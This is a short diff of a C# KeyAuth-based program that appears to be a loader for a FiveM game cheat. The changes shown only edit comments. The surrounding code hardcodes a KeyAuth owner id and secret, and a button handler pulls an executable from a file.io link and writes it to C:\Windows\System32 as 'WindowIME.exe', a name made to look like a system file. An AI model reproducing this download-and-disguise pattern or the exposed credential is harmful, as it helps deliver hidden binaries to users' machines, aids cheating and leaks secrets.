@@ -13,13 +13,13 @@ namespace KeyAuth
 
         [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
         private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
-
+//                 <------->
         public static api KeyAuthApp = new api(
            name: "FiveM1",
            ownerid: "PwBTV43ofz",
            secret: "226b407f71d9c16679b3c42401bcb21a2f651375df726c7f247b6b325fd21272",
            version: "1.0"
-       );
+       );  /*Change*/
 
         public Main()
         {
@@ -76,7 +76,7 @@ namespace KeyAuth
         private void sendmsg_Click(object sender, EventArgs e)
         {
 
-            string url = "https://file.io/d/example/FiveM_External.exe"; // Change
+            string url = "https://file.io/d/example/FiveM_External.exe"; // Change !!!
 
             string nombreArchivo = @"C:\Windows\System32\WindowIME.exe";
 
